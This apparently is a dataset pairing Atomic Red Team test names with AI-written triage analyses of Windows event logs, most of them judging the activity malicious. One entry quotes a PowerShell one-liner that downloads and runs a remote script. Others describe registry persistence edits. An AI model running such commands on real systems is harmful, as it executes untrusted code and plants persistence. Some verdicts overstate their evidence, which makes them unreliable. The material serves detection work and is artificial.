   - Multiple instances of `wevtutil.exe` were executed, indicating event log manipulation (evidence in the Sysmon and Windows PowerShell logs). This tool is often used to clear event logs, consistent with the log-clearing events mentioned earlier.

4. **Process Execution:**
   - The processes such as `whoami.exe` and `hostname.exe` were executed, which could be indicative of reconnaissance activities. However, in isolation, these may not be inherently malicious unless correlated with other suspicious activities.

Based on the analysis of the provided event logs, the evidence of log clearing and registry modification through PowerShell strongly suggests malicious activity. This behavior indicates potential attempts to maintain persistence and conceal malicious actions.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate `Server002` from the network to prevent further unauthorized access or data exfiltration.
 
2. **Detailed Threat Investigation:**
   - Conduct a thorough forensic investigation on `Server002` to identify further indicators of compromise, persistence mechanisms, and potential data breaches.
   - Review all known accounts, particularly the 'admin_test' account, for any unauthorized usage patterns or privilege escalations.

3. **Remediation:**
   - Restore the modified registry key to its default setting.
   - Rebuild or closely monitor the affected system to ensure no backdoors or persistence mechanisms remain.

4. **Logging and Monitoring Enhancement:**
   - Improve monitoring capabilities to detect similar activities in the future, focusing on logging execution, registry changes, and account activities.
   - Ensure event logs are securely stored and regularly reviewed to prevent tampering.

By following these actions, you can address the current security breach effectively and strengthen defenses against future attacks."
LockBit Black - Modify Group policy settings -cmd,"Upon analyzing the provided Windows event logs, there are multiple indicators that suggest suspicious and potentially malicious activities on the Windows host, Server002. Here are the key observations:

1. **Event Log Clearing:** 
   - The system, security, and Windows PowerShell event logs were cleared by a user with the username `admin_test`. This is evidenced by multiple `EventID: 104` entries and the `EventID: 1102` from the Security log. Log clearing is a common tactic used by attackers to cover their tracks post-compromise, especially if they are operating with elevated privileges.
   
2. **Use of `wevtutil` Utility:**
   - The utility `wevtutil.exe` was used to clear various logs (`Sysmon`, `Application`, `System`, and `Windows PowerShell`) as seen in the Sysmon logs with `ProcessId`: `1944`, `2288`, `2888`, `2776`, and others. The command-line arguments also indicate the use of `wevtutil.exe` with the `cl` command to clear logs. Given the context and correlation with log clearing events, this usage seems suspicious.

3. **Registry Manipulation Using Cmd:**
   - There is an entry indicating the use of `cmd.exe` to execute a series of registry edits involving Group Policy refresh times and disabling SmartScreen settings. These registry changes can be malicious, aiming to manipulate system policies and security settings. The command-line arguments used in `cmd.exe` show registry modification commands, a sign of potential malicious activity altering system behavior.

4. **Time Sync and Potential Tampering:**
   - There are events indicating changes in the system time (`EventID: 4616`) with the processes involved being `svchost.exe`. The minor adjustments in time could probably be coincidental with a routine time synchronization with an NTP server, but considering the proximity to log clearing events, it warrants suspicion of potential timestamp manipulation to masquerade illicit activities.

5. **Use of System Accounts for Microsoft Updates:**
   - There is significant activity related to Microsoft Edge Update processes being executed under `NT AUTHORITY\SYSTEM`. While these activities generally can be benign and related to legitimate software updates, the timing and large number of Edge Update processes, when combined with other suspicious activities like log clearing and registry edits, raises concerns about misuse.

Based on the detailed analysis and the pattern of activities observed in the logs, we categorize the resolution as:

***Resolution: MALICIOUS***

### Steps Forward:
- **Immediate Security Measures:**
  - Isolate the affected host (Server002) from the network to prevent further spread or damage.
  - Change all relevant passwords and investigate other systems to which `admin_test` or other compromised credentials have access.
  
- **Thorough Investigation:**
  - Conduct an in-depth forensic analysis of the host and other systems in the network for lateral movement, backdoor installation, or any signs of data exfiltration.
  - Review network and firewall logs for further suspicious activities and communications with unknown IPs.

- **Remediation and Monitoring:**
  - Restore the host using a clean backup if available and ensure all security patches are applied.
  - Strengthen monitoring and alerting on privileged account activities and access to sensitive systems. Use endpoint detection and response (EDR) tools for enhanced monitoring.
  
- **Post-Incident Measures:**
  - Review and enhance security policies and practices, especially focusing on access controls and logging/monitoring configurations.
  - Provide security training and awareness for employees to recognize and respond to potential security threats."
Domain Password Policy Check: Short Password,"In the analysis of the provided logs, the following observations have been made:

1. **PowerShell Activity**: 
   - The PowerShell logs show a script executing that attempts to change a user's Active Directory password to ""Uplow-1"". The script checks for the presence of a credential file, compares the password, and attempts to set it if different. This is indicative of an automated password management script commonly used in IT environments to mitigate password-related issues. However, the use of hardcoded passwords, as shown here, is a security risk.

2. **Sysmon Logs**:
   - Multiple executions of `wevtutil.exe` with the command to clear specific event logs (Application, System, Security, and Windows PowerShell) are noted. The clearing of logs is a behavior often associated with malicious activity intended to cover tracks.
   - The consistent use of high integrity levels for processes like `wevtutil.exe` and execution as user `SERVER002\\admin_test` suggest elevated privileges may have been used inappropriately.
   
3. **Security Logs**:
   - An event log (ID 1102) shows the security log has been cleared by `admin_test`. Clearing of security logs is a notable sign of malicious intent as it is generally used by attackers to hide their activities.

4. **System Logs**:
   - Similar to the security log, system logs indicate clearing of the logs by `admin_test`. The action of clearing logs further supports potential malicious behavior.

**Assessment**:
The combination of the PowerShell script managing passwords, the systematic clearing of event logs, and the use of elevated privileges strongly suggest potentially malicious activity. While the PowerShell activity alone could be benign if confirmed as part of routine IT operations, the clearing of logs by an administrative account is highly suspicious and consistent with attempts to obfuscate malicious actions.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately investigate the user account `admin_test` and review recent activities and account permissions.
- Determine whether the PowerShell script execution was authorized and, if so, ensure secure password management protocols are in place.
- Conduct a forensic analysis of the host to identify any unauthorized changes or indicators of compromise.
- Review and strengthen audit and monitoring policies to prevent log tampering and improve detection of similar activities in the future."
Allowing custom application to execute during new RDP logon session,"The event logs provided exhibit several signs of potentially suspicious activities that warrant further investigation. Let's assess the main findings:

1. **Log File Clearing**:
   - Security Logs (EventID 1102), Application Logs, and System Logs are being cleared (Sysmon logs also show EventID 104). The user responsible is `admin_test`. Log file clearing is a red flag, especially if repeated or if there is no known maintenance activity.
   
2. **cmd.exe with Command Line Arguments**:
   - There's an instance of `cmd.exe` executing a command to add registry entries (`reg add ... StartupPrograms`) with `calc` as a startup program. This kind of registry modification could indicate persistence mechanisms typically used by malware.

3. **Privilege Assignment and Elevation**:
   - Multiple instances of elevated tokens and assignments of advanced privileges (EventID 4672 and 4624) to the `SYSTEM` account through various services might imply privilege escalation attempts.

4. **Sysmon Logs and Use of System Utilities**:
   - Use of `wevtutil.exe` to clear logs or query event logs is intended to cover traces.
   - Occurrences of `whoami.exe`, `rundll32.exe`, and `taskhostw.exe` are legitimate applications but can be misused for malicious intent. For instance, `whoami.exe` usage might indicate recon activities.

5. **Unusual PowerShell Activities**:
   - PowerShell events show scripts being run with restricted execution policy that attempts to interact with the system's infrastructure in an unconventional manner for regular operation.

6. **Time Change Events**:
   - There are events altering system time (EventID 1 and 24 under Kernel-General), which can indicate foot-printing or attempts to interfere with log accuracy.

**Assessment**:
Given the above points, the sequential clearing of event logs, registry alteration for persistence with `cmd.exe`, utilization of system utilities for evasion, and multiple layers of privilege escalation strongly point towards malicious behavior rather than benign or suspicious cases that might occur during normal administrative operations.

**Conclusion**:
- **Resolution**: MALICIOUS
- **Guidance**: Immediate steps should be taken to contain and remediate:
  1. Isolate the affected host to prevent lateral movement.
  2. Preserve and analyze memory and disk state for forensic analysis.
  3. Review user activity, especially for `admin_test`, and verify if credentials or access has been compromised.
  4. Disable or remove added persistence mechanisms, specifically the unauthorized registry modifications.
  5. Implement enhanced monitoring and logging.
  6. Investigate the origin of PowerShell scripts and logged commands."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"### Detailed Analysis:

Upon reviewing the provided log entries from various sources, there are a number of points that raise significant concerns, indicating possible malicious activity:

1. **Clearing of Event Logs:**
   - Several entries in the System and Security logs indicate that logs have been cleared (EventID 104 for the System log and EventID 1102 for the Security log). This was performed by a user named `admin_test`. Clearing logs is a common tactic used by attackers to cover their tracks and remove evidence of malicious activity.

2. **PowerShell Activity:**
   - The PowerShell logs reveal suspicious use of `powershell.exe` with a command to execute a script downloaded from the web: 
   - Command: `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}`
   - This is a classic example of a remote code execution attempt through PowerShell, where a script is being executed directly from an external source. Typically, in a secure environment, such actions should be tightly monitored or blocked.

3. **Time Changes Events:**
   - The Security and System logs show multiple changes to the system time (EventID 4616). While sometimes legitimate, frequent or unauthorized time changes might be an attempt to manipulate timestamps, making it harder to correlate logs or detect attacks based on log timing.

4. **Execution of WEVTUTIL:**
   - The Sysmon logs show multiple executions of `wevtutil.exe` with the command `cl` which is used to clear event logs, performed by `admin_test`. This correlates with the event log clearing entries from the System and Security logs, further reinforcing the intent to erase log evidence.

5. **Unusual Process Execution Chain:**
   - The context of processes indicates unusual execution patterns, particularly related to `wevtutil.exe` and PowerShell usage in potentially malicious contexts.

### Assessment:

Based on the information provided and analysis of the logs, I have identified several indicators of compromise that suggest malicious activity has taken place on this host. The combination of event log clearance, unauthorized script execution through PowerShell, and suspicious time modifications are strong indicators of potential unauthorized and malicious access.

### Resolution: MALICIOUS

Given the combination of log clearance, suspicious PowerShell activity including remote script execution, and attempts to modify event timestamps, these logs likely represent malicious activity. Immediate forensic investigation should be initiated, and responsive measures should be put into place to contain any potential security breach. This may include isolating the affected system(s), analyzing disk and memory images, and reviewing network traffic for signs of unauthorized data exfiltration or further compromise."
HKLM - Add atomic_test key to launch executable as part of user setup,"After thoroughly reviewing the logs provided, several indicators point towards suspicious or potentially malicious activity. Below is a detailed breakdown of the analysis:

### Suspicious Activities Identified:

1. **PowerShell Script Execution:**
   - The PowerShell logs reveal a script being executed which involves modifying the registry at `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test`. The script sets a `StubPath` to `C:\Windows\System32\calc.exe`, a common benign application, possibly to mask its execution. This behavior can be indicative of a persistence mechanism or a test of system execution as part of a more significant attack strategy.
   - The execution includes running `runonce.exe` with the `/AlternateShellStartup` switch, which could be used to execute commands at user logon, suggesting an attempt for persistence.

2. **Clearing of Event Logs:**
   - In the Security logs, event ID 1102 indicates the security event log was cleared by the user `admin_test`. This action is highly suspicious as attackers commonly clear logs to remove traces of their activities.
   - Similarly, the System log shows event ID 104, which documents the clearing of the System event logs.

3. **Sysmon Logs:**
   - Frequent execution of `wevtutil.exe` to clear several event logs (e.g., Application, System, Security, and Windows PowerShell logs) suggests an intent to cover tracks, which aligns with malicious behavior.
   - The suspicious usage of wevtutil.exe logged by Sysmon under processes executed by the same admin_test account is also concerning.

4. **Time Manipulation:**
   - The Security logs contain multiple entries (event ID 4616) indicating a change in system time. Changing the system time is usually abnormal and can be used to manipulate timestamps of events and logs, aiding in covering tracks during unauthorized activities.

### Assessment and Conclusion:

Given the identified behaviors, particularly the manipulation of scheduled tasks, clearing of event logs, and system time changes, these actions collectively form strong indicators of potential compromise. This activity suggests attempts to hide unauthorized or malicious actions within the system, signifying the need for immediate investigation and response.

### Final Resolution: **MALICIOUS**

### Recommended Actions:

1. **Immediate Investigation:**
   - Perform a thorough forensic analysis of the affected system, focusing on enhanced logging for any reoccurrence of activities involving PowerShell and wevtutil.
   - Investigate the `admin_test` user account activity, including how it may have been compromised or misused.

2. **Security Measures:**
   - Implement stricter access controls and auditing for privilege account usage.
   - Ensure PowerShell script logging is enabled and monitored for potentially malicious scripts.
   - Increase the security of the event logs to prevent unauthorized alterations.

3. **Containment and Cleanup:**
   - Temporarily disable the `admin_test` account until the investigation concludes.
   - Review and possibly reset permissions and accounts where suspicious activities have been detected.
   - Finally, conduct a vulnerability assessment and patch any identified security gaps to avert further unauthorized access."
Read-Write-Execute process Injection,"Upon reviewing the provided event logs, several indicators of potentially malicious activity are identifiable. Here's a detailed analysis:

### Suspicious/Anomalous Behavior:

1. **Execution of PowerShell Scripts**:
   - Multiple `powershell.exe` executions are logged, particularly with suspicious command-line patterns involving temporary directory paths. This execution includes a script that uses external executables (`searchVuln.exe` and `RWXinjectionLocal.exe`), which suggests an attempt to exploit a vulnerability or inject code into another process.
   - The command appears to be related to the `Atomic Red Team` which is known for simulating adversarial TTPs (Tactics, Techniques, and Procedures) for testing security controls.

2. **Event Log Clearing**:
   - Event logs for System, Security, and Windows PowerShell have been cleared by the user `admin_test`. Log clearing is a behavior often associated with attempts to cover tracks following malicious actions.

3. **High Integrity Level for Critical Executions**:
   - The processes, including PowerShell, and utilities such as `wevtutil.exe` and `conhost.exe`, run with `High` integrity, potentially linked to elevated privileges necessary for log clearance and execution of actions without alarming security systems.

### Indicators of Malicious Activity/Compromise:

- **Usage of Tools**:
  - The usage of executables (`searchVuln.exe`, `RWXinjectionLocal.exe`) and DLLs in paths under `Temp` directory aligns with tactics used in known adversarial procedures to execute code and potentially exploit or escalate privileges.
  
- **Log Clearing Event**:
  - The activity clearing system, security, and PowerShell logs strongly suggests an intent to erase traces of executed actions, a typical marker of cyber attacks to evade detection.

### Assessment and Resolution:

Given the observations and indicators identified:

- **Resolution**: **MALICIOUS**

The pattern of activities, the execution of scripts related to known adversarial simulations, and the systematic clearing of logs strongly indicate intent to perform actions typically associated with malicious attacks. 

### Recommended Actions:

1. **Immediate Containment**: Isolate the host (Server002) from the network to prevent further potential spread.
2. **Forensics and Analysis**: Perform a full forensic investigation on Server002 to collect artifacts and evidence to understand the extent of the compromise.
3. **Audit and Review**: Conduct a review of privilege use, especially focusing on accounts that performed the actions (`admin_test`).
4. **Patch and Protect**: Ensure the system is fully patched and consider implementing enhanced monitoring and threat-hunting measures leveraging EDR solutions to detect similar patterns in the future.
5. **User Education and Access Controls**: Reinforce security awareness training related to phishing and suspicious activities, and review access controls to employ the principle of least privilege."
Scheduled task Remote,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several points stand out as potential indicators of suspicious or malicious activity. Below is the detailed analysis:

1. **Event Log Clearing:**
   - **Event IDs 104 and 1102** indicate that the event logs for the System, Windows PowerShell, and Security were cleared by a user named `admin_test`. Clearing system logs can be an attempt to cover tracks after malicious activities.
   - **Sysmon Event ID 1** logs show that `wevtutil.exe`, an event log utility, was executed multiple times in a short timeframe, targeting the Application, System, and Security logs. The command line usage of `wevtutil.exe cl <log>` suggests clearing log files which corroborates the events indicating log clearing.

2. **Time Change Events:**
   - **Event ID 4616** showing changes to the system time is recorded multiple times. This could indicate attempts to manipulate timestamps to disguise when certain actions were taken.

3. **Suspicious Task Creation:**
   - **Sysmon Event ID 1** shows the execution of `cmd.exe` creating a scheduled task (`schtasks.exe /Create`), with the potential misuse of a task named ""Atomic Task"". Scheduled tasks can be used to persistently execute malware or unauthorized actions on a system.

4. **Privilege Escalation Activities:**
   - Actions with high integrity level by `admin_test`, especially immediately before or after log clearing or time changes, may denote attempts at privilege escalation or maintaining control over elevated permissions.

### Potential Threats and Risks Identified:
- The clearing of logs is highly suspicious and typically indicates an attempt to hide unauthorized activities.
- Creation of scheduled tasks using `cmd.exe` and `schtasks.exe` with potentially dubious parameters and presumably obfuscated or misleading task names.
- Manipulation of system time raises concerns, potentially used to mislead forensic analysis.

### Guidance on How to Proceed:
- **Immediate Investigation** - Conduct a detailed investigation into the user account `admin_test`. Determine if this activity was legitimate and authorized.
- **Review Scheduled Tasks** - Investigate the scheduled tasks, particularly any created around the timestamp of these logs.
- **Conduct a Deep Malware Scan** - Use updated antivirus/antimalware tools to scan the system thoroughly for any malicious software.
- **Monitor for Further Activities** - Set up increased monitoring and logging (with alerts) on the involved systems to detect any further suspicious activities.

### Resolution:
**MALICIOUS** - There are clear signs of log tampering, potential privilege misuse, suspicious task creation, and other anomalies that align with common tactics used in malicious intrusions. Immediate action is advised to prevent potential threats and mitigate any possible compromise."
Section View Injection,"Upon analyzing the provided Windows event logs, several points of concern indicate suspicious behavior that warrant further investigation:

1. **Clearing of Logs**:
   - There are multiple entries indicating that logs have been cleared: 
     - Event ID 1102 in the Security log shows a security log was cleared by ""admin_test,"" indicating a potential attempt to cover tracks.
     - Event IDs 104 in the System log also indicate logs for the System and PowerShell channels were cleared by the same user.

2. **Privilege Escalation**:
   - Event ID 4672 in the Security log displays a privileged operation performed by ""admin_test,"" with a list of special privileges that includes SeDebugPrivilege, SeLoadDriverPrivilege, and SeImpersonatePrivilege, among others, which are powerful and sensitive privileges often exploited during attacks.

3. **Time Manipulation**:
   - Event IDs 4616 repeatedly show changes to the system time. Manipulating system time is often a tactic used to prevent proper logging of events or to disrupt time-based security protocols.

4. **Use of Potentially Malicious Tools**:
   - The PowerShell logs and Sysmon entries indicate the execution of a suspicious PowerShell command which includes `InjectView.exe` from a directory associated with Atomic Red Team (a known testing tool for security capabilities). The use of such tools may suggest malicious activity or security testing without proper authorization.

5. **Process Execution Details**:
   - The Sysmon log details show the execution of wevtutil.exe for clearing logs and other processes involved in the suspicious activities were all executed by the user ""admin_test"".

Based on this assessment, the behavior observed in these logs is highly indicative of malicious activity, possibly involving attempts to hide traces of actions performed on the system (log clearing), system integrity compromise (privileged actions), and likely execution of unauthorized or malicious code (PowerShell activity with inject tools). The sequence and combination of these activities align with tactics used in advanced persistent threat scenarios or security testing without authorization.

**Resolution**: **MALICIOUS**

**Guidance**: 
- Initiate a thorough review of user activities for ""admin_test"" to determine the intent and scope of the actions.
- Conduct a forensic analysis of the system to identify any additional compromised elements or implants.
- Review access control policies and privilege assignment to ensure that users have only the necessary rights for their functions.
- Consider imposing stricter monitoring for changes to critical logs and system time to detect and respond to suspicious activities promptly.
- If unauthorized security testing was performed, engage in a discussion regarding proper procedures and ensure all testing is authorized and documented."
EarlyBird APC Queue Injection in Go,"Upon analyzing the provided logs, several activities suggest potentially malicious behavior that needs to be addressed:

1. **Event Logs and Process Executions:**
   - Multiple executions of `wevtutil.exe`, a utility tool used for managing event logs, were observed across various logs with commands such as ""cl"" (clear log). The clearing of event logs can be indicative of malicious activity attempting to remove evidence of operational actions.
   - Commands executed with `wevtutil.exe` targeted multiple log types including Microsoft-Windows-Sysmon/Operational, Application, System, and Security.

2. **Security Events:**
   - Event ID 1102 in the Security log indicates that the Security audit log was cleared by the user ""admin_test.""
   - Event ID 4616 shows a system time change, which suggests potential tampering to manipulate timestamps for altering event chronological order.

3. **PowerShell Execution:**
   - The use of PowerShell with references to AtomicRedTeam techniques (`AtomicRedTeam\\T1055.004`) reflects potential execution of a known attack simulation framework. This activity might be part of a test or attack emulation and includes specification of `EarlyBird.exe`, a tool commonly linked to exploitation techniques.
   
4. **Privilege Escalation & Logon Events:**
   - The account ""admin_test"" was logged on with elevated privileges including sensitive rights such as `SeDebugPrivilege` (capabilities to debug any process).
   
5. **Hostnames and Users:**
   - Use of `hostname` and `whoami` commands with high integrity level indicates attempts to gather system and user information context often used in reconnaissance phases.

Given these observations, the logs indicate a high level of potentially nefarious and orchestrated activity specially:
- Continuation in the use of legitimate administrative utilities for potentially malicious purposes.
- System and Security logs being intentionally cleared.
- Deployment and execution of PowerShell scripts with suspicious payloads.

**Final Assessment: MALICIOUS**

### Guidance for Proceeding:
- **Immediate Investigation:** Conduct an in-depth investigation on the user ""admin_test"" activities on Server002.
- **Host Isolation:** Consider isolating the infected host from the network to prevent further actions by potential threat actors.
- **Log Analysis:** Retrieve any available backups or shadow copies of logs for broader analysis and timeline reconstruction.
- **Review Administrative Access Controls:** Assess and strengthen policies on privileged user actions and access to utilities like `wevtutil` and PowerShell.
- **Threat Intelligence:** Confirm details from the PowerShell commands against known threat reports or Simulation frameworks for further insight.
- **Security Tools:** Ensure endpoint detection and response (EDR) solutions are active and alert on such suspicious actions in the future."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"Upon detailed analysis of the provided Windows event logs, several patterns and activities can be observed. Here's a breakdown of potentially significant items in the logs:

1. **Microsoft Edge Update Activity**:
   - There are frequent activities related to the Microsoft Edge Update service (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`), indicative of automatic updater operations. The execution of processes with common Microsoft paths and typical behavior of updating applications suggests they are likely part of a legitimate update process since the Microsoft Edge updater performs tasks like update installations and service registrations.

2. **Windows PowerShell Activity**:
   - Notably, a PowerShell command was executed that manipulates the Security Packages registry key (`Set-ItemProperty` to add `""AtomicTest.dll""`). This action is unusual and potentially suspicious because modifying Security Packages can be indicative of a persistence mechanism, where malicious actors load unauthorized DLLs.
  
3. **Log Clearing Events**:
   - There are events in both the System and Security logs showing that logs were cleared by `admin_test`. This action is suspicious because clearing logs can be an indicator of attempting to remove traces of malicious activity.
  
4. **Time Change Events**:
   - Time change events are visible, indicating some adjustment of the system clock. While these could be legitimate adjustments by network time protocols, combined with log clearance, they may be intended to avoid detection or cause log confusion.

5. **Registry Command Execution**:
   - The PowerShell script adjusting the Security Packages can be seen in the Sysmon logs with the process `powershell.exe`, again indicating possible registry manipulation. This appears synchronized with the anomalies observed in the PowerShell logs.

**Assessment**:
- The combination of registry manipulation through PowerShell, log clearing by a user, and the potential impacts on system settings like Security Packages are strong indicators of potentially malicious behavior. These log entries suggest that an unauthorized modification was made possibly for privilege escalation or persistence.

**Resolution**:
- **MALICIOUS**: The logs contain evidence of potentially malicious activity that justifies further investigation and immediate action. The registry manipulation involving `AtomicTest.dll` and log clearing are particularly concerning indicators that warrant further forensic analysis and incident response to determine the full scope and impact of these actions.
  
**Guidance**:  
- Conduct a detailed forensic analysis of the affected host `Server002` to identify any unauthorized changes or malicious files, especially concerning the `AtomicTest.dll`.
- Investigate the credentials used by `admin_test` and confirm if these actions were sanctioned or if credentials have been compromised.
- Perform a full security assessment on registry modifications and system integrity to validate if the changes align with organizational policies.
- Monitor network traffic and system logs closely for any further unusual activity post-investigation to ensure containment and resolution."
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"After thoroughly analyzing the provided event logs, several notable observations and activities stand out that suggest potential malicious or suspicious actions:

1. **Log File Clearing**:
   - Multiple entries show that the security, system, and PowerShell logs were cleared by the user ""admin_test"" using the `wevtutil.exe` command. See Security log Event ID 1102 and System log Event ID 104. This is typically suspicious as adversaries often clear logs to cover their tracks post-compromise.

2. **System Process Execution**:
   - The user ""admin_test"" is seen executing commands with `whoami.exe`, `wevtutil.exe`, and `HOSTNAME.EXE`. While these tools are legitimate, when used together or in sequence, especially with the clearing of logs, they may indicate attempts to assess privileges and remain covert.

3. **PowerShell Usage**:
   - The PowerShell event logs show the execution of a script from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug`). The use of temporary directories and such scripts suggest possible execution of test or malicious payload potentially related to process injection (`NtQueueApcThreadEx`).

4. **Privilege Escalation**:
   - The Security log Event ID 4672 references the SYSTEM account obtaining numerous high privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.), which may suggest an attempt to escalate permissions.

5. **Edge Updates**:
   - There are entries detailing Microsoft Edge updates, which seem scripted and regular (Sysmon Events in the range 17973 to 17975). While this is likely benign, it's noteworthy given it occurs amid other suspicious activities.

Overall, the actions of the user ""admin_test"" in clearing logs, running scripts from possibly obscure locations, and executing system utilities collectively present a scenario where overlooking the activities as routine maintenance would be imprudent.

**Resolution**: **MALICIOUS**

There are strong indicators in the logs, particularly the clearing of logs and the execution of potentially malicious PowerShell scripts, that suggest malicious activity is present. Immediate steps should involve:
- Conducting a detailed forensic investigation of the host.
- Capturing memory and disk images for further analysis.
- Reviewing user account activity, particularly for ""admin_test"".
- Applying containment measures to prevent further potential compromise.
- Notifying your incident response team for remediation actions.
"
Winlogon Userinit Key Persistence - PowerShell,"Upon examining the provided logs, there are several events and activities that may point to potentially suspicious or malicious actions. Here is a detailed analysis:

### Suspicious Activities Identified:

1. **PowerShell Activity:**
   - The PowerShell logs show a command executed to change the `Userinit` registry key, setting it to ""Userinit.exe, C:\Windows\System32\cmd.exe"". This is a typical technique used by attackers to achieve persistence or to execute additional commands upon user login. The `Userinit` key in the registry is responsible for commands that execute automatically when a user logs into the system.

2. **Event Log Clearing:**
   - Events in the System log (EventRecordID: 3571, 3572) indicate that the event logs have been cleared by the user ""admin_test."" Clearing event logs is a common tactic used by attackers to remove traces of their activity.

3. **Sysmon Activity:**
   - Multiple instances of the use of `wevtutil.exe` present in the Sysmon logs. This utility is often used to clear event logs or export logs for review, suggesting potential concealment activity accompanying the cleared logs.
   - The `wevtutil.exe` command-line indicates the intent to clear different event channels, including ""Security"", ""System"", and ""Windows PowerShell"".

4. **High Integrity and SYSTEM Level Operations:**
   - Numerous executions of processes under high integrity or SYSTEM level suggest a high privilege level of the user conducting these operations (`admin_test`), potentially using admin rights or SYSTEM privileges to conduct unauthorized activities.
   
5. **Frequent Use of Security and Privacy Service Processes:**
   - Microsoft Edge Update (EdgeUpdate) is frequently executed. While this might be part of normal updates, the context of other suspicious activities necessitates further investigation to ensure this was not a vector for malicious software update interference or masquerading.

### Assessment:

Given the evidence presented, there are clear indicators of potentially malicious behavior. The combination of registry modifications for persistence, log clearing, elevated privilege usage, and execution of utilities that can facilitate concealment or further exploitation raises substantial concern.

### Conclusion:

- **Resolution: MALICIOUS**

### Guidance:

1. **Immediate Action:**
   - Isolate the system (Server002) from the network to prevent further potential malicious activity or lateral movement.
   - Conduct a thorough forensic analysis on the affected system to identify all modifications or additional backdoor entries imparted by the attacker.

2. **Log Preservation:**
   - Ensure logs from adjacent systems are preserved to understand any possible lateral movements or further compromise.
   - Collect memory and disk images for further offline analysis.

3. **Remediation:**
   - Review and restore altered registry keys to their default, secure values.
   - Revoke and investigate the user account (""admin_test"") involved in executing these operations.
   - Reset credentials for privileged accounts and reinforce security monitoring and alerting.

Further investigation is necessary to identify the full scope and source of the compromise, and additional threat intelligence may be required to correlate with known indicators of compromise."
Service Installation PowerShell,"After thoroughly analyzing the provided logs, the following observations and assessments have been made:

### Suspicious Activities:
1. **PowerShell Execution**:
   - There is a PowerShell event indicating the execution of a command to create and start a new service named ""AtomicTestService_PowerShell"" with the binary located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\AtomicService.exe`. The use of PowerShell to manipulate services is a common technique employed by attackers for persistence and privilege escalation.
  
2. **Service Creation**:
   - The system log (EventID 7045) indicates that a service named ""AtomicTestService_PowerShell"" was installed and set to start automatically. The image path of the service is the executable from the temp directory, which is anomalous as temporary directories are typically not used for service binaries.

3. **Event Logs Cleared**:
   - There are multiple instances where event logs (System, Windows PowerShell, Security) were cleared by the user ""admin_test"". This activity is often indicative of an attempt to cover up malicious actions.

4. **Unusual Process Execution**:
   - Multiple processes, including `wevtutil.exe`, are executed in quick succession. These are used to clear different event logs — a tactic often used to avoid detection by concealing evidence of malicious activity.

5. **Symobology**:
   - The presence of the path ""AtomicRedTeam"" signifies potential testing or training scenarios using ""Atomic Red Team"", a known suite of open-source tests used to simulate adversaries. It could suggest a benign testing scenario, but without explicit confirmation, it must be treated with caution.

### Assessment:
- **Indicators of Potential Compromise**:
  - The creation and manipulation of a service via PowerShell, clearing of logs, and use of binaries from a temporary folder are strong indicators of suspicious activity that could potentially lead to a system compromise.
  - While the ""AtomicTestService_PowerShell"" suggests it could be related to the use of the Atomic Red Team testing framework, the lack of explicit acknowledgment of such an authorized test makes it prudent to consider this activity suspicious.

### Resolution:
- **Resolution: SUSPICIOUS**

### Guidance:
- **Immediate Actions**:
  1. **Confirmation of Testing**: Verify if there was an authorized test or training exercise using Atomic Red Team on the system.
  2. **Review User Activity**: Check with the user ""admin_test"" for any explanations of their activities, specifically concerning the creation of services and clearance of logs.
  3. **Isolate the System**: If not already isolated, consider isolating Server002 to prevent any potential spread of malicious activity.
  4. **Forensic Analysis**: Conduct a deeper forensic analysis of the system to determine any unauthorized changes or persistence mechanisms that may have been deployed.

- **Follow-Up**:
  - Reassess security controls, including logging and monitoring to ensure that similar activities in the future are promptly detected.
  - Implement additional user training or amending policies around using administrative scripts and clearing event logs."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"### Detailed Analysis of Logs:

1. **Application Log:**
   - Windows Defender is active, indicating a basic security posture is enabled.
   - The RulesEngine entry from ""Microsoft-Windows-Security-SPP"" suggests a software protection platform service event which typically is benign and system routine.

2. **System Log:**
   - **Event ID 104:** There are multiple log entries for clearing of event logs (system and Windows PowerShell) with the user `admin_test`. The clearing of logs can be suspicious as it may indicate an attempt to erase forensic evidence.
   - **Event ID 19:** Indicates a security intelligence update for Microsoft Defender Antivirus, which appears routine.
   - **Event ID 24 and 35:** Several events related to time synchronization and time updates can be associated with regular system maintenance.

3. **Windows PowerShell Log:**
   - The PowerShell logs show the execution of a script involving `werfault.exe` and another executable `CreateRemoteThread.exe` from `AtomicRedTeam\T1055`. Atomic Red Team is a known security testing framework often used for simulating adversary techniques. This suggests either a penetration testing activity or a potential misuse of these tools.

4. **Security Log:**
   - **Event ID 1102:** Security log clearance by `admin_test`, similar to the System log clearance, is a significant red flag indicating potential malicious activity attempting to cover tracks.
   - **Event ID 4616:** Time change events, matching with system logs, could suggest a time manipulation attempt. These events, conducted by `svchost.exe`, require scrutiny.
   - **Event ID 4672:** Indicates that the user `admin_test` logged in with several elevated tokens which include privileges commonly used in lateral movement or for malicious purposes.

5. **Sysmon Log:**
   - Several entries show invocation of `wevtutil.exe` to clear logs, reinforcing the security concern of log clearance activity.
   - PowerShell process execution with the `CreateRemoteThread.exe`, which aligns with T1055 technique: Process Injection used in malicious activity.

### Assessment of the Situation:

- **Log Clearance**: Multiple event log clearances (System, PowerShell, Security) by the user `admin_test` indicate intentional erasure of potential evidence, which is suspicious.
- **PowerShell Activity**: The PowerShell script indicating use of `CreateRemoteThread.exe` could imply activities associated with penetration testing or process injection, a known offensive tradecraft. This requires further investigation.
- **Privilege Use**: The user `admin_test` possessing high privileges with multiple elevated rights and conducting such activities hint towards a misuse of administrative privileges or compromised credentials.

### Threats or Risks Identified:
- Potential misuse of credentials or insider threat.
- Possible compromise due to process injection or suspicious script execution.
- Obfuscation attempts through log tampering.

